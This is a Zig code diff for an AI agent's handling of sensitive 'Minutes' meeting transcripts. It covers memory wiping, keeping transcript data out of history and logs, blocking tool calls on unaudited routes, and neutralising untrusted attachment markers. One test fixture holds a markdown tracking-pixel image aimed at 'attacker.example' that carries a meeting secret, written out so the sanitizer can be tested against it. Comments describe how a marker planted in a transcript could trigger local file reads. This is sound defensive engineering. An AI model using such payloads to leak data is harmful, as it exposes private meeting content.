+        defer outcome.deinit(self.allocator);
+        self.command_reply_data_policy = outcome.reply_data_policy;
+        return try self.allocator.dupe(u8, outcome.text);
+    }
+
+    /// End a legacy text-only turn's display lifetime. The legacy signature
+    /// cannot expose `ReplyDataPolicy`, so clearing every reply is the only
+    /// fail-closed teardown for Minutes-capable callers.
+    pub fn deinitTurnReply(self: *Agent, reply: []const u8) void {
+        wipeOwnedBytes(reply);
+        self.allocator.free(reply);
     }
 
     /// Execute a tool by name lookup.
@@ -6464,8 +7331,35 @@ pub const Agent = struct {
     /// Build provider-ready ChatMessage slice from owned history.
     /// Applies multimodal preprocessing.
     fn buildProviderMessages(self: *Agent, arena: std.mem.Allocator) ![]ChatMessage {
-        const m = try arena.alloc(ChatMessage, self.history.items.len);
+        return self.buildProviderMessagesWithForeground(arena, &.{});
+    }
+
+    fn currentTurnRawUserIndex(self: *const Agent) ?usize {
+        const raw = self.current_turn_raw_user orelse return null;
+        for (self.history.items, 0..) |message, index| {
+            if (message.role == .user and
+                message.content.ptr == raw.ptr and message.content.len == raw.len)
+            {
+                return index;
+            }
+        }
+        return null;
+    }
+
+    /// Build the provider view as durable history followed by a turn-local
+    /// foreground lane. The latter is used by `minutes_read`: it preserves
+    /// native/XML tool pairing for same-turn reasoning without ever becoming
+    /// persistent Agent history.
+    fn buildProviderMessagesWithForeground(
+        self: *Agent,
+        arena: std.mem.Allocator,
+        foreground: []const OwnedMessage,
+    ) ![]ChatMessage {
+        const m = try arena.alloc(ChatMessage, self.history.items.len + foreground.len);
         for (self.history.items, 0..) |*msg, i| {
+            m[i] = self.providerMessageForOwned(msg);
+        }
+        for (foreground, self.history.items.len..) |*msg, i| {
             m[i] = self.providerMessageForOwned(msg);
         }
 
@@ -6501,11 +7395,27 @@ pub const Agent = struct {
         // multimodal loop falls back to the inline / text-note path.
         const uploader = buildProviderVideoUploader(self, arena);
 
-        return multimodal.prepareMessagesForProvider(arena, m, .{
+        // Foreground Minutes messages are sealed untrusted data. In XML mode a
+        // tool-result/reflection message has role `.user`, so passing the full
+        // combined slice to the generic multimodal scanner would interpret a
+        // transcript marker such as `[IMAGE:/path]` as a local-file request.
+        // During a live turn, preprocess only the durable prefix ending at the
+        // exact history-owned inbound user slice. Later synthetic user-role
+        // reflections stay untouched, while that current user's media is
+        // prepared again for every stateless provider iteration. Outside a
+        // live turn, preserve the generic last-user behavior.
+        const durable_prefix = m[0..self.history.items.len];
+        const prepare_len = if (self.current_turn_raw_user != null)
+            if (self.currentTurnRawUserIndex()) |index| index + 1 else return m
+        else
+            durable_prefix.len;
+        const prepared_prefix = try multimodal.prepareMessagesForProvider(arena, durable_prefix[0..prepare_len], .{
             .allowed_dirs = allowed,
             .provider_video_upload = uploader,
             .experimental_video_upload = self.experimental_video_upload,
         });
+        @memcpy(durable_prefix[0..prepare_len], prepared_prefix);
+        return m;
     }
 
     fn promptCacheKey(self: *Agent, buf: *[69]u8) ?[]const u8 {
@@ -6526,15 +7436,52 @@ pub const Agent = struct {
         prompt_cache_key: ?[]const u8,
         tool_surface_plan: tool_surface.Plan,
     ) providers.ChatRequest {
-        return .{
+        var request = providers.ChatRequest{
             .messages = messages,
             .model = effective_model,
             .temperature = self.temperature,
             .max_tokens = self.max_tokens,
-            .tools = if (tool_surface_plan.sendsNativeTools()) self.tool_specs else null,
+            .tools = null,
             .prompt_cache_key = prompt_cache_key,
             .timeout_secs = self.message_timeout_secs,
             .reasoning_effort = self.reasoning_effort,
+            .provider_selection_policy = self.providerSelectionPolicyForCurrentTurn(),
+        };
+        if (tool_surface_plan.sendsNativeTools() and self.provider.supportsNativeToolsForRequest(request)) {
+            request.tools = self.toolSpecsForCurrentTurn();
+        }
+        return request;
+    }
+
+    fn providerSummaryChat(
+        self: *Agent,
+        allocator: std.mem.Allocator,
+        request: providers.ChatRequest,
+        model: []const u8,
+        sensitive: bool,
+    ) !ChatResponse {
+        if (!sensitive) return self.provider.chat(allocator, request, model, self.temperature);
+
+        if (!self.provider.supportsSensitiveStreamingForRequest(request)) {
+            return error.SensitiveStreamingUnsupported;
+        }
+
+        var discard_ctx: u8 = 0;
+        const streamed = try self.provider.streamChat(
+            allocator,
+            request,
+            model,
+            self.temperature,
+            discardSensitiveStream,
+            @ptrCast(&discard_ctx),
+        );
+        return .{
+            .content = streamed.content,
+            .tool_calls = streamed.tool_calls,
+            .usage = streamed.usage,
+            .model = streamed.model,
+            .reasoning_content = streamed.reasoning_content,
+            .stream_tool_call_chunks = streamed.stream_tool_call_chunks,
         };
     }
 
@@ -6542,7 +7489,12 @@ pub const Agent = struct {
         self: *Agent,
         request: providers.ChatRequest,
         assemble_result: context_engine.AssembleResult,
+        capture_allowed: bool,
     ) void {
+        if (!capture_allowed) {
+            self.last_prompt_shape = .{};
+            return;
+        }
         self.last_prompt_shape = context_builder.buildPromptShapeFromProviderRequest(request, .{
             .stable_system_prompt_bytes = assemble_result.stable_prefix_bytes,
             .stable_system_prompt_hash = assemble_result.stable_prefix_hash,
@@ -6560,12 +7512,13 @@ pub const Agent = struct {
 
     fn sampleProviderPreflight(
         self: *Agent,
+        allocator: std.mem.Allocator,
         request: providers.ChatRequest,
         effective_model: []const u8,
         iteration: u32,
     ) void {
         self.provider_preflight_active = false;
-        const maybe_estimate = self.provider.estimateTokens(self.allocator, request, effective_model) catch |err| {
+        const maybe_estimate = self.provider.estimateTokens(allocator, request, effective_model) catch |err| {
             log.info("provider.preflight unavailable provider={s} model={s} iteration={d} err={s}", .{
                 self.provider.getName(),
                 effective_model,
@@ -6804,6 +7757,19 @@ pub const Agent = struct {
         return true;
     }
 
+    fn shouldRouteToVisionFallbackForCurrentTurn(
+        self: *const Agent,
+        has_images: bool,
+        minutes_foreground_latched: bool,
+    ) bool {
+        // Once transcript content exists, never reinterpret the primary-only
+        // approval as permission to send it to a vision sidecar. Pre-read
+        // image turns have already removed Minutes from their turn surface,
+        // so ordinary vision routing remains intact here.
+        if (minutes_foreground_latched or self.canInvokeMinutesRead()) return false;
+        return shouldRouteToVisionFallback(self.model_name, self.vision_fallback_model, has_images);
+    }
+
     /// Remove every `video_base64` content part from `messages`, replacing
     /// each affected `content_parts` array with an arena-allocated copy that
     /// omits the video. A message left with no parts drops back to
@@ -6952,8 +7918,18 @@ pub const Agent = struct {
 
     /// Build a flat ChatMessage slice from owned history.
     fn buildMessageSlice(self: *Agent) ![]ChatMessage {
-        const messages = try self.allocator.alloc(ChatMessage, self.history.items.len);
+        return self.buildMessageSliceWithForeground(&.{});
+    }
+
+    fn buildMessageSliceWithForeground(
+        self: *Agent,
+        foreground: []const OwnedMessage,
+    ) ![]ChatMessage {
+        const messages = try self.allocator.alloc(ChatMessage, self.history.items.len + foreground.len);
         for (self.history.items, 0..) |*msg, i| {
+            messages[i] = self.providerMessageForOwned(msg);
+        }
+        for (foreground, self.history.items.len..) |*msg, i| {
             messages[i] = self.providerMessageForOwned(msg);
         }
         return messages;
@@ -6963,18 +7939,40 @@ pub const Agent = struct {
     /// Providers allocate content, tool_calls, and model on the heap.
     /// After extracting/duping what we need, call this to prevent leaks.
     fn freeResponseFields(self: *Agent, resp: *ChatResponse) void {
+        self.freeResponseFieldsWithPolicy(resp, false);
+    }
+
+    fn freeResponseFieldsWithPolicy(self: *Agent, resp: *ChatResponse, sensitive: bool) void {
         if (resp.content) |c| {
-            if (c.len > 0) self.allocator.free(c);
+            if (c.len > 0) {
+                if (sensitive) wipeOwnedBytes(c);
+                self.allocator.free(c);
+            }
         }
         for (resp.tool_calls) |tc| {
-            if (tc.id.len > 0) self.allocator.free(tc.id);
-            if (tc.name.len > 0) self.allocator.free(tc.name);
-            if (tc.arguments.len > 0) self.allocator.free(tc.arguments);
+            if (tc.id.len > 0) {
+                if (sensitive) wipeOwnedBytes(tc.id);
+                self.allocator.free(tc.id);
+            }
+            if (tc.name.len > 0) {
+                if (sensitive) wipeOwnedBytes(tc.name);
+                self.allocator.free(tc.name);
+            }
+            if (tc.arguments.len > 0) {
+                if (sensitive) wipeOwnedBytes(tc.arguments);
+                self.allocator.free(tc.arguments);
+            }
         }
         if (resp.tool_calls.len > 0) self.allocator.free(resp.tool_calls);
-        if (resp.model.len > 0) self.allocator.free(resp.model);
+        if (resp.model.len > 0) {
+            if (sensitive) wipeOwnedBytes(resp.model);
+            self.allocator.free(resp.model);
+        }
         if (resp.reasoning_content) |rc| {
-            if (rc.len > 0) self.allocator.free(rc);
+            if (rc.len > 0) {
+                if (sensitive) wipeOwnedBytes(rc);
+                self.allocator.free(rc);
+            }
         }
         // Mark as consumed to prevent double-free
         resp.content = null;
@@ -8404,6 +9402,56 @@ test "Agent provider messages emit raw user content (context v2, no enrichment s
     defer allocator.free(flat_messages);
     try std.testing.expectEqual(@as(usize, 1), flat_messages.len);
     try std.testing.expectEqualStrings("raw user text", flat_messages[0].content);
+}
+
+test "Agent keeps current-turn media ahead of synthetic and Minutes user-role messages" {
+    const allocator = std.testing.allocator;
+    var noop = observability.NoopObserver{};
+    var agent = Agent{
+        .allocator = allocator,
+        .provider = undefined,
+        .tools = &.{},
+        .tool_specs = try allocator.alloc(ToolSpec, 0),
+        .mem = null,
+        .observer = noop.observer(),
+        .model_name = "test",
+        .temperature = 0.7,
+        .workspace_dir = "/tmp",
+        .max_tool_iterations = 10,
+        .max_history_messages = 50,
+        .auto_save = false,
+        .history = .empty,
+        .total_tokens = 0,
+        .has_system_prompt = false,
+    };
+    defer agent.deinit();
+
+    const raw = try allocator.dupe(u8, "Inspect [IMAGE:data:image/png;base64,iVBORw0KGgo=]");
+    var raw_transferred = false;
+    errdefer if (!raw_transferred) allocator.free(raw);
+    try agent.history.append(allocator, .{ .role = .user, .content = raw });
+    raw_transferred = true;
+    agent.current_turn_raw_user = raw;
+    const reflection_message = try allocator.dupe(u8, "Reflect on [IMAGE:/tmp/must-not-open.png]");
+    var reflection_transferred = false;
+    errdefer if (!reflection_transferred) allocator.free(reflection_message);
+    try agent.history.append(allocator, .{ .role = .user, .content = reflection_message });
+    reflection_transferred = true;
+
+    const foreground = [_]Agent.OwnedMessage{.{
+        .role = .user,
+        .content = "transcript [IMAGE:/tmp/transcript-must-not-open.png]",
+    }};
+    var arena_impl = std.heap.ArenaAllocator.init(allocator);
+    defer arena_impl.deinit();
+    const messages = try agent.buildProviderMessagesWithForeground(arena_impl.allocator(), &foreground);
+
+    try std.testing.expectEqual(@as(usize, 3), messages.len);
+    try std.testing.expect(Agent.hasImageContentParts(messages[0..1]));
+    try std.testing.expect(messages[1].content_parts == null);
+    try std.testing.expect(messages[2].content_parts == null);
+    try std.testing.expectEqualStrings(reflection_message, messages[1].content);
+    try std.testing.expectEqualStrings(foreground[0].content, messages[2].content);
 }
 
 test "Agent max_tool_iterations default" {
@@ -11983,6 +13031,34 @@ test "Agent tool loop frees dynamic tool outputs" {
             return true;
         }
 
+        fn supportsStreaming(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn streamChat(
+            ptr: *anyopaque,
+            allocator: std.mem.Allocator,
+            request: providers.ChatRequest,
+            model: []const u8,
+            temperature: f64,
+            callback: providers.StreamCallback,
+            callback_ctx: *anyopaque,
+        ) anyerror!providers.StreamChatResult {
+            const response = try chat(ptr, allocator, request, model, temperature);
+            if (response.content) |content| {
+                if (content.len > 0) callback(callback_ctx, providers.StreamChunk.textDelta(content));
+            }
+            callback(callback_ctx, providers.StreamChunk.finalChunk());
+            return .{
+                .content = response.content,
+                .tool_calls = response.tool_calls,
+                .usage = response.usage,
+                .model = response.model,
+                .reasoning_content = response.reasoning_content,
+                .stream_tool_call_chunks = response.stream_tool_call_chunks,
+            };
+        }
+
         fn getName(_: *anyopaque) []const u8 {
             return "step-provider";
         }
@@ -13529,6 +14605,97 @@ test "Agent stripToolCallMarkup removes multiple stray fragments" {
     try std.testing.expect(std.mem.indexOf(u8, out, "Got it, alaa.") != null);
 }
 
+test "minutes foreground suppresses every untrusted attachment control marker" {
+    const allocator = std.testing.allocator;
+    const output = try Agent.suppressUntrustedAttachmentMarkers(
+        allocator,
+        "safe [IMAGE:/tmp/a.png] [PHOTO:/tmp/photo.png] [video:/tmp/b.mp4] [DOCUMENT:/tmp/c.pdf] " ++
+            "[fIlE:/tmp/d.txt] [AUDIO:/tmp/e.mp3] [voice:/tmp/f.ogg] " ++
+            "tail [IMAGE:/unterminated",
+    );
+    defer allocator.free(output);
+
+    try std.testing.expectEqualStrings(
+        "safe [attachment omitted] [attachment omitted] [attachment omitted] [attachment omitted] " ++
+            "[attachment omitted] [attachment omitted] [attachment omitted] " ++
+            "tail [attachment omitted]",
+        output,
+    );
+}
+
+test "minutes foreground defangs active remote media and link previews" {
+    const allocator = std.testing.allocator;
+    const output = try Agent.sanitizeMinutesDisplayText(
+        allocator,
+        "![tracking](https://attacker.example/pixel.png?meeting=secret)\n" ++
+            "http://attacker.example/second.png\n" ++
+            "HTTPS://ATTACKER.EXAMPLE/MIXED.JPG\n" ++
+            "[IMAGE:/absolute/private.png]",
+    );
+    defer freeOwnedBytesWithPolicy(allocator, output, true);
+
+    try std.testing.expect(std.ascii.indexOfIgnoreCase(output, "https://") == null);
+    try std.testing.expect(std.ascii.indexOfIgnoreCase(output, "http://") == null);
+    try std.testing.expect(std.mem.indexOf(u8, output, "hxxps://attacker.example/pixel.png?meeting=secret") != null);
+    try std.testing.expect(std.mem.indexOf(u8, output, "hxxp://attacker.example/second.png") != null);
+    try std.testing.expect(std.mem.indexOf(u8, output, "[attachment omitted]") != null);
+}
+
+test "minutes display sanitizers clear partial output on allocation failure" {
+    const marker_input = "minutes-suppress-oom-secret[IMAGE:/private/path]";
+    const markup_input = "minutes-markup-oom-secret<tool_call>{\"name\":\"x\"}</tool_call>tail";
+
+    var fail_index: usize = 0;
+    while (fail_index < 5) : (fail_index += 1) {
+        var backing: [512]u8 = undefined;
+        @memset(&backing, 0xaa);
+        var fixed = std.heap.FixedBufferAllocator.init(&backing);
+        var failing = std.testing.FailingAllocator.init(
+            fixed.allocator(),
+            .{ .fail_index = fail_index, .resize_fail_index = 0 },
+        );
+        const allocator = failing.allocator();
+
+        const suppressed = Agent.suppressUntrustedAttachmentMarkers(allocator, marker_input) catch |err| {
+            try std.testing.expectEqual(error.OutOfMemory, err);
+            try std.testing.expect(std.mem.indexOf(u8, &backing, "minutes-suppress-oom-secret") == null);
+            continue;
+        };
+        freeOwnedBytesWithPolicy(allocator, suppressed, true);
+        try std.testing.expect(std.mem.indexOf(u8, &backing, "minutes-suppress-oom-secret") == null);
+    }
+
+    fail_index = 0;
+    while (fail_index < 5) : (fail_index += 1) {
+        var backing: [512]u8 = undefined;
+        @memset(&backing, 0xaa);
+        var fixed = std.heap.FixedBufferAllocator.init(&backing);
+        var failing = std.testing.FailingAllocator.init(
+            fixed.allocator(),
+            .{ .fail_index = fail_index, .resize_fail_index = 0 },
+        );
+        const allocator = failing.allocator();
+
+        const scrubbed = Agent.stripToolCallMarkup(allocator, markup_input);
+        if (scrubbed.ptr != markup_input.ptr) freeOwnedBytesWithPolicy(allocator, scrubbed, true);
+        try std.testing.expect(std.mem.indexOf(u8, &backing, "minutes-markup-oom-secret") == null);
+    }
+}
+
+test "Minutes provider scratch allocator clears released transcript bytes" {
+    const sentinel = "minutes-provider-scratch-secret-3a6e";
+    var backing: [256]u8 = undefined;
+    @memset(&backing, 0xaa);
+    var fixed = std.heap.FixedBufferAllocator.init(&backing);
+    var zeroizing = ZeroizingAllocator{ .child = fixed.allocator() };
+    const allocator = zeroizing.allocator();
+
+    const scratch = try allocator.dupe(u8, sentinel);
+    try std.testing.expect(std.mem.indexOf(u8, &backing, sentinel) != null);
+    allocator.free(scratch);
+    try std.testing.expect(std.mem.indexOf(u8, &backing, sentinel) == null);
+}
+
 test "tts_audio_enabled_does_not_mutate_assistant_text" {
     const allocator = std.testing.allocator;
     const ProviderState = struct {
@@ -14519,6 +15686,1809 @@ const CountingRuntimeInfoTool = struct {
     }
 };
 
+const MinutesBlockedSentinelTool = struct {
+    call_count: usize = 0,
+
+    pub const tool_name = "minutes-sensitive-" ++ MINUTES_FOREGROUND_RAW_SENTINEL;
+    pub const tool_description = "Test-only post-Minutes execution sentinel";
+    pub const tool_params = "{}";
+    pub const vtable = tools_mod.ToolVTable(@This());
+
+    pub fn tool(self: *@This()) tools_mod.Tool {
+        return .{ .ptr = @ptrCast(self), .vtable = &vtable };
+    }
+
+    pub fn execute(self: *@This(), allocator: std.mem.Allocator, _: tools_mod.JsonObjectMap) !tools_mod.ToolResult {
+        self.call_count += 1;
+        return .{
+            .success = true,
+            .output = try allocator.dupe(u8, MINUTES_FOREGROUND_RAW_SENTINEL),
+        };
+    }
+};
+
+const MINUTES_FOREGROUND_RAW_SENTINEL = "minutes-raw-sentinel-7fd3";
+const MINUTES_FOREGROUND_REASONING_SENTINEL = "minutes-reasoning-sentinel-9a21";
+const MINUTES_DURABLE_MEDIA_SENTINEL = "minutes-durable-media-sentinel-31c8";
+const MINUTES_FOREGROUND_TOOL_OUTPUT = MINUTES_FOREGROUND_RAW_SENTINEL ++
+    " [IMAGE:data:image/png;base64,iVBORw0KGgo=]";
+
+/// A hermetic stand-in for the real cross-spoke client. The response is
+/// deliberately sensitive-looking so the turn tests can prove that it reaches
+/// the same-turn provider while never crossing a durable/observer boundary.
+const MinutesForegroundSentinelTool = struct {
+    call_count: usize = 0,
+
+    pub const tool_name = "minutes_read";
+    pub const tool_description = "Test-only Minutes read sentinel";
+    pub const tool_params = "{}";
+    pub const vtable = tools_mod.ToolVTable(@This());
+
+    pub fn tool(self: *@This()) tools_mod.Tool {
+        return .{ .ptr = @ptrCast(self), .vtable = &vtable };
+    }
+
+    pub fn execute(self: *@This(), allocator: std.mem.Allocator, _: tools_mod.JsonObjectMap) !tools_mod.ToolResult {
+        self.call_count += 1;
+        return .{
+            .success = true,
+            .output = try allocator.dupe(u8, MINUTES_FOREGROUND_TOOL_OUTPUT),
+        };
+    }
+};
+
+const MinutesPrivacyObserver = struct {
+    saw_minutes_start: bool = false,
+    saw_minutes_result: bool = false,
+    saw_input_preview: bool = false,
+    saw_output_preview: bool = false,
+    saw_sensitive_narration: bool = false,
+    saw_sensitive_observer: bool = false,
+    saw_non_minutes_start: bool = false,
+    saw_non_minutes_result: bool = false,
+    saw_plan_created: bool = false,
+
+    const vtable_impl = observability.Observer.VTable{
+        .record_event = recordEventImpl,
+        .record_metric = recordMetricImpl,
+        .flush = flushImpl,
+        .name = nameImpl,
+    };
+
+    fn observer(self: *@This()) observability.Observer {
+        return .{ .ptr = @ptrCast(self), .vtable = &vtable_impl };
+    }
+
+    fn containsSensitive(value: []const u8) bool {
+        return std.mem.indexOf(u8, value, MINUTES_FOREGROUND_RAW_SENTINEL) != null or
+            std.mem.indexOf(u8, value, MINUTES_FOREGROUND_REASONING_SENTINEL) != null;
+    }
+
+    fn optionalContainsSensitive(value: ?[]const u8) bool {
+        return if (value) |present| containsSensitive(present) else false;
+    }
+
+    fn filesContainSensitive(files: ?[]const []const u8) bool {
+        if (files) |present| {
+            for (present) |file| {
+                if (containsSensitive(file)) return true;
+            }
+        }
+        return false;
+    }
+
+    fn recordEventImpl(ptr: *anyopaque, event: *const observability.ObserverEvent) void {
+        const self: *@This() = @ptrCast(@alignCast(ptr));
+        switch (event.*) {
+            .tool_call_start => |e| {
+                if (containsSensitive(e.tool) or
+                    optionalContainsSensitive(e.tool_use_id) or
+                    optionalContainsSensitive(e.input_preview) or
+                    optionalContainsSensitive(e.command) or
+                    filesContainSensitive(e.files))
+                {
+                    self.saw_sensitive_observer = true;
+                }
+                if (std.mem.eql(u8, e.tool, MinutesForegroundSentinelTool.tool_name)) {
+                    self.saw_minutes_start = true;
+                    self.saw_input_preview = e.input_preview != null;
+                } else if (std.mem.eql(u8, e.tool, CountingRuntimeInfoTool.tool_name) or
+                    std.mem.eql(u8, e.tool, MinutesBlockedSentinelTool.tool_name))
+                {
+                    self.saw_non_minutes_start = true;
+                }
+            },
+            .tool_call => |e| {
+                if (containsSensitive(e.tool) or
+                    optionalContainsSensitive(e.tool_use_id) or
+                    optionalContainsSensitive(e.output_preview) or
+                    optionalContainsSensitive(e.command) or
+                    filesContainSensitive(e.files))
+                {
+                    self.saw_sensitive_observer = true;
+                }
+                if (std.mem.eql(u8, e.tool, MinutesForegroundSentinelTool.tool_name)) {
+                    self.saw_minutes_result = true;
+                    self.saw_output_preview = e.output_preview != null;
+                } else if (std.mem.eql(u8, e.tool, CountingRuntimeInfoTool.tool_name) or
+                    std.mem.eql(u8, e.tool, MinutesBlockedSentinelTool.tool_name))
+                {
+                    self.saw_non_minutes_result = true;
+                }
+            },
+            .approval_required => |e| {
+                if (containsSensitive(e.tool) or
+                    containsSensitive(e.reason) or
+                    optionalContainsSensitive(e.approval_id) or
+                    optionalContainsSensitive(e.tool_call_id))
+                {
+                    self.saw_sensitive_observer = true;
+                }
+            },
+            .narration_frame => |e| {
+                if (containsSensitive(e.message)) self.saw_sensitive_narration = true;
+            },
+            .turn_stage => |e| {
+                if (std.mem.eql(u8, e.stage, "plan_created")) self.saw_plan_created = true;
+            },
+            else => {},
+        }
+    }
+
+    fn recordMetricImpl(_: *anyopaque, _: *const observability.ObserverMetric) void {}
+    fn flushImpl(_: *anyopaque) void {}
+    fn nameImpl(_: *anyopaque) []const u8 {
+        return "minutes_privacy_capture";
+    }
+};
+
+fn minutesTestRequestContains(request: providers.ChatRequest, needle: []const u8) bool {
+    for (request.messages) |message| {
+        if (std.mem.indexOf(u8, message.content, needle) != null) return true;
+        if (message.reasoning_content) |reasoning| {
+            if (std.mem.indexOf(u8, reasoning, needle) != null) return true;
+        }
+    }
+    return false;
+}
+
+fn installMinutesTestTurnContext(budget: *tools_mod.MinutesReadTurnBudget) void {
+    tools_mod.setTurnContext(.{
+        .origin = .user,
+        .minutes_read_budget = budget,
+    });
+}
+
+fn supportsSensitiveTestStreaming(_: *anyopaque, _: providers.ChatRequest) bool {
+    return true;
+}
+
+test "image fallback removes Minutes from request and blocks hallucinated execution" {
+    const VisionProvider = struct {
+        call_count: usize = 0,
+        saw_filtered_surface: bool = false,
+
+        fn chatWithSystem(_: *anyopaque, allocator: std.mem.Allocator, _: ?[]const u8, _: []const u8, _: []const u8, _: f64) anyerror![]const u8 {
+            return allocator.dupe(u8, "");
+        }
+
+        fn chat(
+            ptr: *anyopaque,
+            allocator: std.mem.Allocator,
+            request: providers.ChatRequest,
+            effective_model: []const u8,
+            _: f64,
+        ) anyerror!providers.ChatResponse {
+            const self: *@This() = @ptrCast(@alignCast(ptr));
+            self.call_count += 1;
+            if (request.provider_selection_policy != .fallback_chain) return error.UnexpectedProviderPolicy;
+            if (!std.mem.eql(u8, request.model, "gpt-4o")) return error.UnexpectedRequestModel;
+            if (!std.mem.eql(u8, effective_model, "gpt-4o")) return error.UnexpectedEffectiveModel;
+            if (!Agent.hasImageContentParts(request.messages)) return error.MissingCurrentTurnImage;
+            if (request.tools != null) return error.UnexpectedToolSpecs;
+            if (self.call_count == 1 and
+                minutesTestRequestContains(request, MinutesForegroundSentinelTool.tool_name))
+            {
+                return error.UnexpectedMinutesPromptSurface;
+            }
+            self.saw_filtered_surface = true;
+
+            if (self.call_count == 1) {
+                const calls = try allocator.alloc(providers.ToolCall, 1);
+                calls[0] = .{
+                    .id = try allocator.dupe(u8, "hallucinated-minutes-call"),
+                    .name = try allocator.dupe(u8, MinutesForegroundSentinelTool.tool_name),
+                    .arguments = try allocator.dupe(u8, "{\"action\":\"index\"}"),
+                };
+                return .{
+                    .content = try allocator.dupe(u8, ""),
+                    .tool_calls = calls,
+                    .usage = .{},
+                    .model = try allocator.dupe(u8, "gpt-4o"),
+                };
+            }
+
+            if (minutesTestRequestContains(request, MINUTES_FOREGROUND_RAW_SENTINEL)) {
+                return error.TestUnexpectedResult;
+            }
+            return .{
+                .content = try allocator.dupe(u8, "I can analyze the image, but Minutes is unavailable on this vision route."),
+                .tool_calls = &.{},
+                .usage = .{},
+                .model = try allocator.dupe(u8, "gpt-4o"),
+            };
+        }
+
+        fn supportsNativeTools(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn supportsStreaming(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn streamChat(
+            ptr: *anyopaque,
+            allocator: std.mem.Allocator,
+            request: providers.ChatRequest,
+            model: []const u8,
+            temperature: f64,
+            callback: providers.StreamCallback,
+            callback_ctx: *anyopaque,
+        ) anyerror!providers.StreamChatResult {
+            const response = try chat(ptr, allocator, request, model, temperature);
+            if (response.content) |content| {
+                if (content.len > 0) callback(callback_ctx, providers.StreamChunk.textDelta(content));
+            }
+            callback(callback_ctx, providers.StreamChunk.finalChunk());
+            return .{
+                .content = response.content,
+                .tool_calls = response.tool_calls,
+                .usage = response.usage,
+                .model = response.model,
+                .reasoning_content = response.reasoning_content,
+                .stream_tool_call_chunks = response.stream_tool_call_chunks,
+            };
+        }
+
+        fn getName(_: *anyopaque) []const u8 {
+            return "vision-minutes-boundary-test";
+        }
+
+        fn deinitFn(_: *anyopaque) void {}
+    };
+
+    const allocator = std.testing.allocator;
+    var provider_state = VisionProvider{};
+    const provider_vtable = Provider.VTable{
+        .chatWithSystem = VisionProvider.chatWithSystem,
+        .chat = VisionProvider.chat,
+        .supportsNativeTools = VisionProvider.supportsNativeTools,
+        .supports_sensitive_streaming_for_request = supportsSensitiveTestStreaming,
+        .supports_streaming = VisionProvider.supportsStreaming,
+        .stream_chat = VisionProvider.streamChat,
+        .getName = VisionProvider.getName,
+        .deinit = VisionProvider.deinitFn,
+    };
+    const provider = Provider{ .ptr = @ptrCast(&provider_state), .vtable = &provider_vtable };
+
+    var minutes_tool = MinutesForegroundSentinelTool{};
+    const tool_list = [_]Tool{minutes_tool.tool()};
+    const specs = try allocator.alloc(ToolSpec, tool_list.len);
+    for (tool_list, 0..) |tool, i| {
+        specs[i] = .{ .name = tool.name(), .description = tool.description(), .parameters_json = tool.parametersJson() };
+    }
+
+    var noop = observability.NoopObserver{};
+    var agent = Agent{
+        .allocator = allocator,
+        .provider = provider,
+        .tools = &tool_list,
+        .tool_specs = specs,
+        .mem = null,
+        .observer = noop.observer(),
+        .model_name = "text-only-primary",
+        .vision_fallback_model = "gpt-4o",
+        .temperature = 0.7,
+        .workspace_dir = "/tmp",
+        .max_tool_iterations = 3,
+        .max_history_messages = 50,
+        .auto_save = false,
+        .history = .empty,
+    };
+    defer agent.deinit();
+
+    var minutes_budget = tools_mod.MinutesReadTurnBudget{};
+    installMinutesTestTurnContext(&minutes_budget);
+    defer tools_mod.clearTurnContext();
+    var outcome = try agent.turnOutcome(
+        "[IMAGE:data:image/png;base64,iVBORw0KGgo=] Describe this image.",
+    );
+    defer outcome.deinit(allocator);
+
+    try std.testing.expectEqual(Agent.ReplyDataPolicy.ordinary, outcome.reply_data_policy);
+    try std.testing.expectEqualStrings(
+        "I can analyze the image, but Minutes is unavailable on this vision route.",
+        outcome.text,
+    );
+    try std.testing.expectEqual(@as(usize, 2), provider_state.call_count);
+    try std.testing.expect(provider_state.saw_filtered_surface);
+    try std.testing.expectEqual(@as(usize, 0), minutes_tool.call_count);
+    try std.testing.expect(tools_mod.getTurnContext().minutes_read_budget == &minutes_budget);
+    for (agent.history.items) |message| {
+        try std.testing.expect(std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+    }
+}
+
+test "unaudited provider removes Minutes from request and blocks hallucinated execution" {
+    const UnsafeProvider = struct {
+        call_count: usize = 0,
+        saw_filtered_surface: bool = false,
+
+        fn chatWithSystem(_: *anyopaque, allocator: std.mem.Allocator, _: ?[]const u8, _: []const u8, _: []const u8, _: f64) anyerror![]const u8 {
+            return allocator.dupe(u8, "");
+        }
+
+        fn chat(
+            ptr: *anyopaque,
+            allocator: std.mem.Allocator,
+            request: providers.ChatRequest,
+            effective_model: []const u8,
+            _: f64,
+        ) anyerror!providers.ChatResponse {
+            const self: *@This() = @ptrCast(@alignCast(ptr));
+            self.call_count += 1;
+            if (request.provider_selection_policy != .fallback_chain or
+                !std.mem.eql(u8, request.model, "test-model") or
+                !std.mem.eql(u8, effective_model, "test-model") or
+                request.tools != null or
+                (self.call_count == 1 and
+                    minutesTestRequestContains(request, MinutesForegroundSentinelTool.tool_name)))
+            {
+                return error.TestUnexpectedResult;
+            }
+            self.saw_filtered_surface = true;
+
+            if (self.call_count == 1) {
+                const calls = try allocator.alloc(providers.ToolCall, 1);
+                calls[0] = .{
+                    .id = try allocator.dupe(u8, "hallucinated-unsafe-minutes-call"),
+                    .name = try allocator.dupe(u8, MinutesForegroundSentinelTool.tool_name),
+                    .arguments = try allocator.dupe(u8, "{\"action\":\"index\"}"),
+                };
+                return .{
+                    .content = try allocator.dupe(u8, ""),
+                    .tool_calls = calls,
+                    .usage = .{},
+                    .model = try allocator.dupe(u8, "test-model"),
+                };
+            }
+
+            if (minutesTestRequestContains(request, MINUTES_FOREGROUND_RAW_SENTINEL)) {
+                return error.TestUnexpectedResult;
+            }
+            return .{
+                .content = try allocator.dupe(u8, "Minutes is unavailable on this provider route."),
+                .tool_calls = &.{},
+                .usage = .{},
+                .model = try allocator.dupe(u8, "test-model"),
+            };
+        }
+
+        fn supportsNativeTools(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn supportsStreaming(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn streamChat(_: *anyopaque, _: std.mem.Allocator, _: providers.ChatRequest, _: []const u8, _: f64, _: providers.StreamCallback, _: *anyopaque) anyerror!providers.StreamChatResult {
+            return error.UnexpectedSensitiveStream;
+        }
+
+        fn getName(_: *anyopaque) []const u8 {
+            return "unaudited-minutes-boundary-test";
+        }
+
+        fn deinitFn(_: *anyopaque) void {}
+    };
